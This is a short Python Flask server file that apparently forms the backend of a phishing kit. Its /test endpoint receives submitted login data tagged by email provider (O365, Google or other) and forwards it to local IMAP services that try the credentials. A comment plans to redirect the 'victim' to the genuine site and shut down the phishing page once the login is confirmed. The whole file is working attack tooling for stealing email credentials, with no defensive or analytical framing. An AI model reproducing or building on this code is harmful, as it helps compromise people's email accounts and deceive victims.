#!/bin/python3
from flask import (
    Flask,
    render_template,
    request, 
    jsonify
)
import requests

# Create the application instance
app = Flask(__name__)

# Create a URL route in our application for "/"
@app.route('/')
def home():
    return "<html><body><h1>hi there!</h1></body></html>"

@app.route('/test',methods=['POST'])
def test():
    content = request.get_json(silent=True)
    c=content['client']
    if(c=="O365"):
        #call O365
        requests.post("http://localhost:5010/imapO365",json=content)
    elif(c=="Google"):
        #call google
        requests.post("http://localhost:5010/imapGoogle",json=content)
    elif(c=="Other"):
        #call other, try to guess
        requests.post("http://localhost:5010/imapTry",json=content)

    #TODO: Must check the return from imap post. if 200 returns the victim to genuine site and calls to kill the instance serving the phishing page. if not just refresh. 
    return "OK"

# If we're running in stand alone mode, run the application
if __name__ == '__main__':
    app.run(debug=True)
